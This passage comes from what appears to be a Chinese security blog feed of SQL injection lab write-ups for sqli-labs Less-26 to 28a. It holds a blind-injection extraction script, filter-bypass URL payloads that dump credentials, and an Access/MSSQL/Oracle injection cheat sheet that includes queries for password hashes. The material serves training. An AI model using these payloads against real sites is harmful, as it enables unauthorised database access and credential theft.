string">"id"</span><span class="token punctuation">,</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"passwoorrd"</span><span class="token punctuation">]</span>        <span class="token comment"># 附加url</span>    start_str <span class="token operator">=</span> <span class="token string">"1'%26%26"</span>    end_str <span class="token operator">=</span> <span class="token string">"||'1'='"</span>        <span class="token comment"># 连接select</span>    where_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">#where_str = "where(table_schema='"+database_name+"'%26%26table_name='"+table_name+"')"</span>    select_str <span class="token operator">=</span> <span class="token string">"select(group_concat("</span><span class="token operator">+</span>info_column_name<span class="token operator">+</span><span class="token string">"))from("</span><span class="token operator">+</span>info_database_name<span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>info_table_name<span class="token operator">+</span><span class="token string">")"</span><span class="token operator">+</span>where_str    <span class="token comment">#select_str = "select(group_concat(concat_ws('$',"+column_name[0]+","+column_name[1]+","+column_name[2]+")))from("+table_name+")"</span>        <span class="token comment"># 连接payload</span>    sqli_str <span class="token operator">=</span> <span class="token string">"(ascii(mid(("</span><span class="token operator">+</span>select_str<span class="token operator">+</span><span class="token string">"),"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>char_index<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",1))>"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")"</span>    payload <span class="token operator">=</span> start_str <span class="token operator">+</span> sqli_str <span class="token operator">+</span> end_str    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">execute</span><span class="token punctuation">(</span>char_index<span class="token punctuation">,</span> <span class="token builtin">ascii</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 连接url</span>    url <span class="token operator">=</span> <span class="token string">"http://localhost:8088/sqlilabs/Less-26/?id="</span>    exec_url <span class="token operator">=</span> url <span class="token operator">+</span> getPayload<span class="token punctuation">(</span>char_index<span class="token punctuation">,</span> <span class="token builtin">ascii</span><span class="token punctuation">)</span>    <span class="token comment">#print(exec_url)</span>    <span class="token comment"># 检查回显</span>    echo <span class="token operator">=</span> <span class="token string">"Your Login name"</span>    content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>exec_url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> echo <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">dichotomy</span><span class="token punctuation">(</span>char_index<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>        <span class="token comment"># 二分法</span>        <span class="token builtin">ascii</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>left<span class="token operator">+</span>right<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> execute<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>char_index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> <span class="token builtin">ascii</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> <span class="token builtin">ascii</span>        <span class="token comment"># 结束二分</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> right<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> execute<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>char_index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token builtin">ascii</span> <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> <span class="token builtin">len</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 查询结果的长度</span>        char <span class="token operator">=</span> dichotomy<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">31</span><span class="token punctuation">:</span> <span class="token comment"># 单条查询结果已被遍历</span>            <span class="token keyword">break</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>char<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考原文：<a href="https://www.jianshu.com/p/ff72f2c6d99c">https://www.jianshu.com/p/ff72f2c6d99c</a></p><hr><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>源码分析：</p><p>在Less-26的基础上Less-27将<code>union</code>和<code>select</code>字段进行了过滤：</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209145938742.png" alt="image-20220209145938742"></p><p><strong><code>\s</code>表示空白字符空格、制表符、换页符等，<code>/i</code>表示忽略大小写。</strong></p><h2 id="具体步骤-5"><a href="#具体步骤-5" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>使用编码注入判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39;%0band%0b&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209150455232.png" alt="image-20220209150455232"></p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39; and(extractvalue(1,concat(0x7e,database(),0x7e)))and&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209151300652.png" alt="image-20220209151300652"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39; and(extractvalue(1,concat(0x7e,(seselselectectlect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e)))and&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209151357185.png" alt="image-20220209151357185"></p><p>后续过程如以往。</p><hr><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;1&quot; &quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152251922.png" alt="image-20220209152251922"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSElECT%0b1,2,3%0bor%0b&quot;1&quot;&#x3D;&quot;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152519463.png" alt="image-20220209152519463"></p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,database(),3%0bor%0b&quot;1&quot;&#x3D;&quot;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152730899.png" alt="image-20220209152730899"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(table_name),3%0bFROM%0binformation_schema.tables%0bWHERE%0btable_schema &#x3D; &#39;security&#39;%0bor%0b&quot;1&quot;&#x3D;&quot;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152850481.png" alt="image-20220209152850481"></p><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(column_name),3%0bFROM%0binformation_schema.columns%0bWHERE%0btable_schema&#x3D;&#39;security&#39;%0bAND%0btable_name&#x3D;&#39;users&#39;%0bor%0b&quot;1&quot;&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153059934.png" alt="image-20220209153059934"></p><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(concat_ws(&quot;:&quot;,username,password)),3%0bFROM%0busers%0bWHERE%0b&quot;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153308600.png" alt="image-20220209153308600"></p><hr><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>判断注入点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1&#39;) OR (&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153509042.png" alt="image-20220209153509042"></p><p>判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0bORDER%0bBY%0b3%0bor%0b(&#39;1&#39;)&#x3D;(&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153601689.png" alt="image-20220209153601689"></p><p>判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,2,&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209154702357.png" alt="image-20220209154702357"></p><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,(select(group_concat(schema_name))from(information_schema.schemata) ),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209154757665.png" alt="image-20220209154757665"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()) ),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209154840411.png" alt="image-20220209154840411"></p><hr><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>盲注，只过滤了union+select，单引号括号闭合。可以使用空格和注释</p><p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209155123396.png" alt="image-20220209155123396"></p><h2 id="具体步骤-6"><a href="#具体步骤-6" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>布尔盲注猜字段：</p><p>数据库长度：<code>?id=1&#39;) and length((database()))=8 --+</code></p><p>猜数据库名：<code>?id=1&#39;) and substr((select database()),1,1)=&quot;s&quot; --+</code></p><p>猜表长：<code>?id=1&#39;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1) )=6 --+</code></p><p>猜表名：<code>?id=1&#39;) and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&quot;e&quot; --+</code></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-Oracle等注入</title>
      <link href="/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><p>##数据库注入</p><p>除Access数据库之外，其他类型数据库注入流程：</p><p><img src="/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/image-20220207191425163.png" alt="image-20220207191425163"></p><p><strong>什么决定网站注入点的用户权限？</strong></p><p><strong>SQL的配置文件用户名</strong></p><hr><h2 id="Access注入（特殊）"><a href="#Access注入（特殊）" class="headerlink" title="Access注入（特殊）"></a>Access注入（特殊）</h2><p>####Access数据结构</p><p>​               表名</p><p>​                       列名</p><p>​                               数据</p><p><strong>注意</strong>：1、Access数据库只有一个数据库；</p><p>​            2、 <strong>Access数据库只能靠暴力猜解</strong>；</p><p>​            3、 一般Access数据库与ASP网站一起搭建；</p><p>​            4、 Access没有数据库名，没有版本号，统统都没有；</p><p>​            5、 注入的时候无需查询什么版本等等。</p><p>​            6、 access无注释符</p><h4 id="注入方法："><a href="#注入方法：" class="headerlink" title="注入方法："></a>注入方法：</h4><p>1、联合查询法</p><p>2、逐字猜解法（常用）</p><h5 id="联合注入："><a href="#联合注入：" class="headerlink" title="联合注入："></a>联合注入：</h5><p><strong>第一步</strong>：判断注入点</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 and 1&#x3D;1返回正常?id&#x3D;1 and 1&#x3D;2返回错误’存在注入点。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第二步</strong>：判断列的字段数</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 order by 3返回正常?id&#x3D;1 order by 4返回错误字段数为3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第三步</strong>：猜解表名（判断回显点）</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 union select 1,2,3 from 表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>第四步</strong>：猜解列名</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 union select 1,列名一,列名二 from 表名猜出列名则会返回数据把上面得到的那两个数字中替换成表中的用户名与密码字段名：例：username 和 password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第五步</strong>：爆出数据</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 union select 1,admin,password from 表名回显点2爆出用户名，回显点3爆出密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>#####逐字猜解法：（适用于 order by 不能用的地方）</p><p><strong>第一步</strong>：判断注入点</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; 单引号注入?id&#x3D;1 and 1&#x3D;1 数字型注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>第二步</strong>：判断字段数</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 order by 3返回正常?id&#x3D;1 order by 4返回错误字段数为3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>第三步</strong>：猜表名</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 and exists (select * from admin) ——猜表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>第四步</strong>：猜列名</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 and exists (select username&#x2F;password from admin) ——猜列名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>第五步</strong>：猜字段中数据长度（1.确定长度 2.确定asc数据）</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 and (select top 1 len(username ) from admin)&gt;5  --判断长度?id&#x3D;1 and (select top 1 asc(mid(username ,1,1)) from admin(表名))&#x3D;97 判断字段第一位(后几位依次类推)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>top（附属查询）：</p><p>例：top 1 用来返回第一行的内容（也可以用来限制返回内容的行数）</p><hr><h2 id="MSSQL-SQL-Server-注入"><a href="#MSSQL-SQL-Server-注入" class="headerlink" title="MSSQL(SQL Server)注入"></a>MSSQL(SQL Server)注入</h2><p><strong>常用框架组合方法ASP+MSSQL</strong></p><p>1、判断数据库类型</p><pre class="line-numbers language-none"><code class="language-none">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个（sysobjects：MSSQL数据库特有的数据表，系统对象表）（Exists()：子语句查询，Exists方法返回一个布尔值，该布尔值指示在 Dictionary 对象中是否存在指定的 key，如果存在，返回 true，否则返回 false）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、判断当前数据库</p><pre class="line-numbers language-none"><code class="language-none">select db_name(N)  表示当前数据库，其中的参数表示第N个数据库，从0开始<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、查看所有数据库</p><pre class="line-numbers language-none"><code class="language-none">SELECT top 1 Name FROM Master..SysDatabases  在系统数据库中能够查询所有的数据库（Master系统数据库）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、注入点权限判断（根据页面显示效果）</p><pre class="line-numbers language-none"><code class="language-none">1 select is_srvrolemember(&#39;sysadmin&#39;);判断当前是否为sa2 select is_srvrolemember(&#39;db_owner&#39;);判断当前用户写文件、读文件的权限（db_owner）3 select is_srvrolemember(&#39;public&#39;);  判断是否有public权限，可以爆破表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>5、查看数据库版本</p><pre class="line-numbers language-none"><code class="language-none">select @@version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6、查询表名</p><pre class="line-numbers language-none"><code class="language-none">select top 1 name from test.sys.all_objects where type&#x3D;&#39;U&#39; AND is_ms_shipped&#x3D;0  获取第一个表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7、查询列名</p><pre class="line-numbers language-none"><code class="language-none">select top 1 COLUMN_NAME from test.information_schema.columns where TABLE_NAME&#x3D;&#39;users&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8、获取字段数据</p><pre class="line-numbers language-none"><code class="language-none">select top 1 username from usersselect top 1 password from users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p>引导：</p><pre class="line-numbers language-none"><code class="language-none">dual表，此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual涉及到的基本用法：select * from all_tables 查询出所有的表select * from user_tables 查询出当前用户的表select * from all_tab_columns 查询出所有的字段select * from user_tab_columns  查询出当前用户的字段select * from v$version 查版本rownum&#x3D;1   (限制查询返回的总行数为一条)对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="注入语句："><a href="#注入语句：" class="headerlink" title="注入语句："></a>注入语句：</h4><p><strong>（Oracle 字符串区分大小写）</strong></p><p>获取数据库版本：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> banner <span class="token operator">LIKE</span> <span class="token string">'Oracle%'</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> version <span class="token keyword">FROM</span> v$instance<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取数据库系统版本：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">where</span> banner <span class="token operator">like</span> <span class="token string">'TNS%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取当前数据库用户：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span> <span class="token keyword">FROM</span> dual<span class="token punctuation">;</span><span class="token keyword">select</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USERENV'</span><span class="token punctuation">,</span><span class="token string">'CURRENT_USER'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取当前用户权限：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> session_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取所有数据库用户密码：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> password<span class="token punctuation">,</span> spare4 <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取DB文件路径：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> V$DATAFILE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出DBA账户：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> grantee <span class="token keyword">FROM</span> dba_sys_privs <span class="token keyword">WHERE</span> ADMIN_OPTION <span class="token operator">=</span> ‘YES’ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>服务器监听IP：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_address <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取当前操作系统：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span>  dbms_utility<span class="token punctuation">.</span>port_string <span class="token keyword">FROM</span> dual<span class="token punctuation">;</span><span class="token keyword">select</span> member <span class="token keyword">from</span> v$logfile <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span>  <span class="token comment">//路径也是可以判断的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取服务器SID：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> instance_name <span class="token keyword">from</span> v$instance<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出数据库：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> owner <span class="token keyword">FROM</span> all_tables<span class="token punctuation">;</span> — 列出数据库 <span class="token punctuation">(</span>一个用户一个<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>联合注入语句</strong>：</p><p><strong>（Oracle区分大小写）</strong></p><p>判断字段：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">order</span> <span class="token keyword">by</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'null'</span> 根据<span class="token string">''</span> 判断哪里是字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>爆表:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token 